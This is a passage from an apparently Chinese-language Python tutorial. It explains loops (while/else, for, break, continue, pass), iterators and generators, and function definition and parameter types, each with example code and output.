<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入一个数字  :5</span><br><span class="line">你输入的数字是:  5</span><br><span class="line">输入一个数字</span><br></pre></td></tr></table></figure>
<p>你可以使用 <code>CTRL+C</code> 来退出当前的无限循环。</p>
<p>无限循环在服务器上客户端的实时请求非常有用。</p>
<h4 id="while-循环使用else语句"><a href="#while-循环使用else语句" class="headerlink" title="while 循环使用else语句"></a>while 循环使用else语句</h4><p>在 <code>while … else</code> 在条件语句为 <code>false</code> 时执行 <code>else</code> 的语句块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count &lt; <span class="number">5</span>:</span><br><span class="line">   <span class="keyword">print</span> (count, <span class="string">" 小于 5"</span>)</span><br><span class="line">   count = count + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">print</span> (count, <span class="string">" 大于或等于 5"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0  小于 5</span><br><span class="line">1  小于 5</span><br><span class="line">2  小于 5</span><br><span class="line">3  小于 5</span><br><span class="line">4  小于 5</span><br><span class="line">5  大于或等于 5</span><br></pre></td></tr></table></figure>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>Python for循环可以遍历任何序列的项目，如一个列表或者一个字符串。</p>
<p>for循环的一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> &lt;variable&gt; <span class="keyword">in</span> &lt;sequence&gt;:</span><br><span class="line">    &lt;statements&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;statements&gt;</span><br></pre></td></tr></table></figure>
<p>Python loop循环实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">languages = [<span class="string">"C"</span>, <span class="string">"C++"</span>, <span class="string">"Perl"</span>, <span class="string">"Python"</span>] </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> languages:</span><br><span class="line">    <span class="keyword">print</span> (x)</span><br><span class="line">C</span><br><span class="line">C++</span><br><span class="line">Perl</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>
<h3 id="break和continue语句及循环中的else子句"><a href="#break和continue语句及循环中的else子句" class="headerlink" title="break和continue语句及循环中的else子句"></a>break和continue语句及循环中的else子句</h3><p>break 语句可以跳出 for 和 while 的循环体。如果你从 for 或 while 循环中终止，任何对应的循环 else 块将不执行。 实例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">'Runoob'</span>:     <span class="comment"># 第一个实例</span></span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">'b'</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前字母为 :'</span>, letter)</span><br><span class="line">  </span><br><span class="line">var = <span class="number">10</span>                    <span class="comment"># 第二个实例</span></span><br><span class="line"><span class="keyword">while</span> var &gt; <span class="number">0</span>:              </span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当期变量值为 :'</span>, var)</span><br><span class="line">   var = var <span class="number">-1</span></span><br><span class="line">   <span class="keyword">if</span> var == <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前字母为 : R</span><br><span class="line">当前字母为 : u</span><br><span class="line">当前字母为 : n</span><br><span class="line">当前字母为 : o</span><br><span class="line">当前字母为 : o</span><br><span class="line">当期变量值为 : 10</span><br><span class="line">当期变量值为 : 9</span><br><span class="line">当期变量值为 : 8</span><br><span class="line">当期变量值为 : 7</span><br><span class="line">当期变量值为 : 6</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>
<p>continue语句被用来告诉Python跳过当前循环块中的剩余语句，然后继续进行下一轮循环。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">'Runoob'</span>:     <span class="comment"># 第一个实例</span></span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">'o'</span>:        <span class="comment"># 字母为 o 时跳过输出</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前字母 :'</span>, letter)</span><br><span class="line"> </span><br><span class="line">var = <span class="number">10</span>                    <span class="comment"># 第二个实例</span></span><br><span class="line"><span class="keyword">while</span> var &gt; <span class="number">0</span>:              </span><br><span class="line">   var = var <span class="number">-1</span></span><br><span class="line">   <span class="keyword">if</span> var == <span class="number">5</span>:             <span class="comment"># 变量为 5 时跳过输出</span></span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前变量值 :'</span>, var)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前字母 : R</span><br><span class="line">当前字母 : u</span><br><span class="line">当前字母 : n</span><br><span class="line">当前字母 : b</span><br><span class="line">当前变量值 : 9</span><br><span class="line">当前变量值 : 8</span><br><span class="line">当前变量值 : 7</span><br><span class="line">当前变量值 : 6</span><br><span class="line">当前变量值 : 4</span><br><span class="line">当前变量值 : 3</span><br><span class="line">当前变量值 : 2</span><br><span class="line">当前变量值 : 1</span><br><span class="line">当前变量值 : 0</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>
<p>循环语句可以有 else 子句，它在穷尽列表(以for循环)或条件变为 false (以while循环)导致循环终止时被执行,但循环被break终止时不执行。</p>
<p>如下实例用于查询质数的循环例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>, n):</span><br><span class="line">        <span class="keyword">if</span> n % x == <span class="number">0</span>:</span><br><span class="line">            print(n, <span class="string">'等于'</span>, x, <span class="string">'*'</span>, n//x)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 循环中没有找到元素</span></span><br><span class="line">        print(n, <span class="string">' 是质数'</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2  是质数</span><br><span class="line">3  是质数</span><br><span class="line">4 等于 2 * 2</span><br><span class="line">5  是质数</span><br><span class="line">6 等于 2 * 3</span><br><span class="line">7  是质数</span><br><span class="line">8 等于 2 * 4</span><br><span class="line">9 等于 3 * 3</span><br></pre></td></tr></table></figure>
<h3 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h3><p>Python pass是空语句，是为了保持程序结构的完整性。</p>
<p>pass 不做任何事情，一般用做占位语句，如下实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># 等待键盘中断 (Ctrl+C)</span></span><br></pre></td></tr></table></figure>
<p>最小的类:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmptyClass</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>以下实例在字母为 o 时 执行 pass 语句块:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> <span class="string">'Runoob'</span>: </span><br><span class="line">   <span class="keyword">if</span> letter == <span class="string">'o'</span>:</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">      <span class="keyword">print</span> (<span class="string">'执行 pass 块'</span>)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">'当前字母 :'</span>, letter)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Good bye!"</span>)</span><br></pre></td></tr></table></figure>
<p>执行以上脚本输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前字母 : R</span><br><span class="line">当前字母 : u</span><br><span class="line">当前字母 : n</span><br><span class="line">执行 pass 块</span><br><span class="line">当前字母 : o</span><br><span class="line">执行 pass 块</span><br><span class="line">当前字母 : o</span><br><span class="line">当前字母 : b</span><br><span class="line">Good bye!</span><br></pre></td></tr></table></figure>

<h2 id="迭代器与生成器"><a href="#迭代器与生成器" class="headerlink" title="迭代器与生成器"></a>迭代器与生成器</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代是Python最强大的功能之一，是访问集合元素的一种方式。</p>
<p>迭代器是一个可以记住遍历的位置的对象。</p>
<p>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</p>
<p>迭代器有两个基本的方法：iter() 和 next()。</p>
<p>字符串，列表或元组对象都可用于创建迭代器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">it = iter(list)    <span class="comment"># 创建迭代器对象</span></span><br><span class="line"><span class="keyword">print</span> (next(it))</span><br><span class="line"><span class="keyword">print</span> (next(it))</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%BF%AD%E4%BB%A3%E5%99%A8.PNG" alt="迭代器"><br>迭代器对象可以使用常规for语句进行遍历：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line">list=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">it = iter(list)    <span class="comment"># 创建迭代器对象</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> it:</span><br><span class="line">    <span class="keyword">print</span> (x, end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/for%E8%BF%AD%E4%BB%A3.PNG" alt="for迭代"><br>也可以使用 next() 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys         <span class="comment"># 引入 sys 模块</span></span><br><span class="line"> </span><br><span class="line">list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">it = iter(list)    <span class="comment"># 创建迭代器对象</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (next(it))</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/next.PNG" alt="使用next函数"></p>
<h3 id="创建一个迭代器"><a href="#创建一个迭代器" class="headerlink" title="创建一个迭代器"></a>创建一个迭代器</h3><p>把一个类作为一个迭代器使用需要在类中实现两个方法 <strong>iter</strong>() 与 <strong>next</strong>() 。</p>
<p>如果你已经了解的面向对象编程，都支持类都有一个构造函数，Python 的构造函数为 <strong>init</strong>(), 它会在对象初始化的时候执行。</p>
<p><strong>iter</strong>() 方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 <strong>next</strong>() 方法并通过 StopIteration 异常标识迭代的完成。</p>
<p><strong>next</strong>() 方法（Python 2 里是 next()）会返回下一个迭代器对象。</p>
<p>创建一个返回数字的迭代器，初始值为 1，逐步递增 1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNumbers</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> self</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">    x = self.a</span><br><span class="line">    self.a += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"> </span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br><span class="line">print(next(myiter))</span><br></pre></td></tr></table></figure>
<p>执行输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
<h3 id="StopIteration"><a href="#StopIteration" class="headerlink" title="StopIteration"></a>StopIteration</h3><p>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 <strong>next</strong>() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代。</p>
<p>在 20 次迭代后停止执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNumbers</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> self</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> self.a &lt;= <span class="number">20</span>:</span><br><span class="line">      x = self.a</span><br><span class="line">      self.a += <span class="number">1</span></span><br><span class="line">      <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> StopIteration</span><br><span class="line"> </span><br><span class="line">myclass = MyNumbers()</span><br><span class="line">myiter = iter(myclass)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> myiter:</span><br><span class="line">  print(x)</span><br></pre></td></tr></table></figure>
<p>执行输出结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td></tr></table></figure>
<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>在 Python 中，使用了 yield 的函数被称为生成器（generator）。</p>
<p>跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。</p>
<p>在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。</p>
<p>调用一个生成器函数，返回的是一个迭代器对象。</p>
<p>以下实例使用 yield 实现斐波那契数列：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(n)</span>:</span> <span class="comment"># 生成器函数 - 斐波那契</span></span><br><span class="line">    a, b, counter = <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> (counter &gt; n): </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">f = fibonacci(<span class="number">10</span>) <span class="comment"># f 是一个迭代器，由生成器返回生成</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (next(f), end=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<p>执行以上程序，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 1 1 2 3 5 8 13 21 34 55</span><br></pre></td></tr></table></figure>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。</p>
<p>函数能提高应用的模块性，和代码的重复利用率。你已经知道Python提供了许多内建函数，比如print()。但你也可以自己创建函数，这被叫做用户自定义函数。</p>
<h3 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h3><p>你可以定义一个由自己想要功能的函数，以下是简单的规则：<br>· 函数代码块以 def 关键词开头，后接函数标识符名称和圆括号 ()。<br>· 任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。<br>· 函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。<br>· 函数内容以冒号起始，并且缩进。<br>· return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>Python 定义函数使用 def 关键字，一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名（参数列表）:</span></span><br><span class="line">    函数体</span><br></pre></td></tr></table></figure>
<p>默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。</p>
<h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>定义一个函数：给了函数一个名称，指定了函数里包含的参数，和代码块结构。</p>
<p>这个函数的基本结构完成以后，你可以通过另一个函数调用执行，也可以直接从 Python 命令提示符执行。</p>
<p>如下实例调用了 printme() 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">printme(<span class="string">"我要调用用户自定义函数!"</span>)</span><br><span class="line">printme(<span class="string">"再次调用同一函数"</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我要调用用户自定义函数!</span><br><span class="line">再次调用同一函数</span><br></pre></td></tr></table></figure>
<h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 python 中，类型属于对象，变量是没有类型的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">a=<span class="string">"Runoob"</span></span><br></pre></td></tr></table></figure>
<p>以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。</p>
<h3 id="mutable-与不可更改-immutable-对象"><a href="#mutable-与不可更改-immutable-对象" class="headerlink" title="(mutable)与不可更改(immutable)对象"></a>(mutable)与不可更改(immutable)对象</h3><p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>
<pre><code>·`不可变类型`：变量赋值 a=5 后再赋值 a=10，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。

·`可变类型`：变量赋值 la=[1,2,3,4] 后再赋值 la[2]=5 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</code></pre><p>python 函数的参数传递：</p>
<pre><code>·`不可变类型`：类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。

·`可变类型`：类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</code></pre><p>python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。</p>
<h4 id="python-传不可变对象实例"><a href="#python-传不可变对象实例" class="headerlink" title="python 传不可变对象实例"></a>python 传不可变对象实例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeInt</span><span class="params">( a )</span>:</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line">print( b ) <span class="comment"># 结果是 2</span></span><br></pre></td></tr></table></figure>
<p>实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p>
<h4 id="传可变对象实例"><a href="#传可变对象实例" class="headerlink" title="传可变对象实例"></a>传可变对象实例</h4><p>可变对象在函数里修改了参数，那么在调用这个函数的函数里，原始的参数也被改变了。例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeme</span><span class="params">( mylist )</span>:</span></span><br><span class="line">   <span class="string">"修改传入的列表"</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"函数内取值: "</span>, mylist)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用changeme函数</span></span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"函数外取值: "</span>, mylist)</span><br></pre></td></tr></table></figure>
<p>传入函数的和在末尾添加新内容的对象用的是同一个引用。故输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">函数内取值:  [10, 20, 30, [1, 2, 3, 4]]</span><br><span class="line">函数外取值:  [10, 20, 30, [1, 2, 3, 4]]</span><br></pre></td></tr></table></figure>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>以下是调用函数时可使用的正式参数类型：</p>
<pre><code>·必需参数
·关键字参数
·默认参数
·不定长参数</code></pre><h4 id="必需参数"><a href="#必需参数" class="headerlink" title="必需参数"></a>必需参数</h4><p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
<p>调用printme()函数，你必须传入一个参数，不然会出现语法错误：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme()</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    printme()</span><br><span class="line">TypeError: printme() missing <span class="number">1</span> required positional argument: <span class="string">'str'</span></span><br></pre></td></tr></table></figure>
<h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p>
<p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>
<p>以下实例在函数 printme() 调用时使用参数名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span><span class="params">( str )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (str)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme( str = <span class="string">"菜鸟教程"</span>)</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">菜鸟教程</span><br></pre></td></tr></table></figure>
<p>以下实例中演示了函数参数的使用不需要使用指定顺序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( name, age )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"名字: "</span>, name)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"年龄: "</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">"runoob"</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">名字:  runoob</span><br><span class="line">年龄:  50</span><br></pre></td></tr></table></figure>
<h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span><span class="params">( name, age = <span class="number">35</span> )</span>:</span></span><br><span class="line">   <span class="string">"打印任何传入的字符串"</span></span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"名字: "</span>, name)</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"年龄: "</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">"runoob"</span> )</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"------------------------"</span>)</span><br><span class="line">printinfo( name=<span class="string">"runoob"</span> )</span><br></pre></td></tr></table></figure>
<p>以上实例输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">名字:  runoob</span><br><span class="line">年龄:  50</span><br><span class="line">------------------------</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  35</span><br></pre></td></tr></table></figure>
<h4 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h4><p>你可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述 2 种参数不同，声明时不会命名。基本语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">functionname</span><span class="params">([formal_args,] *var_args_tuple )</span>:</span></span><br><span class="line">   <span class="string">"函数_文档字符串"</span></span><br><span class="line">   function_suite</span><br><span class="line">   <span class="keyword">return</span> [expression]</span><br></pre></td></tr></table></figure>
<p>加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</p>
